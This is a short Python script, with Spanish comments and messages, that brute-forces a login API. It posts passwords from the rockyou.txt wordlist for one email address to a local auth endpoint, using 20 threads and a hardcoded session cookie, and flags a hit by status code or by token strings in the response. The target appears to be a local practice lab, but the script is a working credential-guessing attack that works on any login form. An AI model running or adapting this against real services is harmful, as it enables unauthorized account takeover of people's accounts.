import requests
import json
from concurrent.futures import ThreadPoolExecutor

url = "http://localhost:8888/identity/api/auth/login"
email = "robot001@example.com"
passwords_file = "/usr/share/wordlists/rockyou.txt"
success_codes = [200, 302]  # Ajusta según tu API

headers = {
    "Content-Type": "application/json",
    "Cookie": "chat_session_id=f65db2d4-2f55-4e3d-8c6e-a66918730619",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
}

def try_password(password):
    data = {"email": email, "password": password}
    try:
        response = requests.post(url, json=data, headers=headers, timeout=5)
        print(f"[+] Probando: {password} -> {response.status_code}")
        
        if response.status_code in success_codes:
            print(f"🎯 ¡CONTRASEÑA ENCONTRADA! {password}")
            return password
        # También chequea respuestas con tokens o "success":true
        if '"success":true' in response.text or '"token"' in response.text.lower():
            print(f"🎯 ¡CONTRASEÑA ENCONTRADA! {password}")
            return password
    except:
        pass
    return None

# Lee wordlist
with open(passwords_file, 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

# Brute force con 20 threads
with ThreadPoolExecutor(max_workers=20) as executor:
    for result in executor.map(try_password, passwords):
        if result:
            print(f"\n¡ÉXITO! Contraseña: {result}")
            break
